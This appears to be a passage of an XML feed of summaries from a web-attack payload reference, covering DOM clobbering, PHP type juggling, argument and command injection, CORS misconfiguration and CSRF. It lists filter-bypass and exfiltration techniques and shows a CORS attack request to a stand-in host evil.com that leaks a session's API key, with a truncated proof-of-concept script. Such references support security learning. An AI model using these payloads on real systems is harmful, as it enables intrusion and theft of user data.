      <description>Dom Clobbering # DOM Clobbering is a technique where global variables can be overwritten or &amp;ldquo;clobbered&amp;rdquo; by naming HTML elements with certain IDs or names. This can cause unexpected behavior in scripts and potentially lead to security vulnerabilities.
Summary # Lab Exploit References Lab # Lab: Exploiting DOM clobbering to enable XSS Lab: Clobbering DOM attributes to bypass HTML filters Lab: DOM clobbering test case protected by CSP Exploit # Exploitation requires any kind of HTML injection in the page.</description>

      <description>Type Juggling # PHP is a loosely typed language, which means it tries to predict the programmer&amp;rsquo;s intent and automatically converts variables to different types whenever it seems necessary. For example, a string containing only numbers can be treated as an integer or a float. However, this automatic conversion (or type juggling) can lead to unexpected results, especially when comparing variables using the &amp;lsquo;==&amp;rsquo; operator, which only checks for value equality (loose comparison), not type and value equality (strict comparison).</description>

      <description>Argument Injection # Argument injection is similar to command injection as tainted data is passed to to a command executed in a shell without proper sanitization/escaping.
It can happen in different situations, where you can only inject arguments to a command:
Improper sanitization (regex) Injection of arguments into a fixed command (PHP:escapeshellcmd, Python: Popen) Bash expansion (ex: *) In the following example, a python script takes the inputs from the command line to generate a curl command:</description>

      <description>Command Injection # Command injection is a security vulnerability that allows an attacker to execute arbitrary commands inside a vulnerable application.
Summary # Tools Exploits Basic commands Chaining commands Inside a command Filter Bypasses Bypass without space Bypass with a line return Bypass with backslash newline Bypass characters filter via hex encoding Bypass blacklisted words Bypass with single quote Bypass with double quote Bypass with backslash and slash Bypass with $@ Bypass with $() Bypass with variable expansion Bypass with wildcards Challenge Time based data exfiltration DNS based data exfiltration Polyglot command injection Backgrounding long running commands References Tools # commix - Automated All-in-One OS command injection and exploitation tool Exploits # Basic commands # Execute the command and voila :p</description>

      <description>Usually you want to target an API endpoint. Use the following payload to exploit a CORS misconfiguration on target https://victim.example.com/endpoint.
Vulnerable Example: Origin Reflection # Vulnerable Implementation # GET /endpoint HTTP/1.1 Host: victim.example.com Origin: https://evil.com Cookie: sessionid=... HTTP/1.1 200 OK Access-Control-Allow-Origin: https://evil.com Access-Control-Allow-Credentials: true {&amp;#34;[private API key]&amp;#34;} Proof of concept # This PoC requires that the respective JS script is hosted at evil.com
var req = new XMLHttpRequest(); req.onload = reqListener; req.</description>

      <description>Cross-Site Request Forgery # Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they&amp;rsquo;re currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. - OWASP
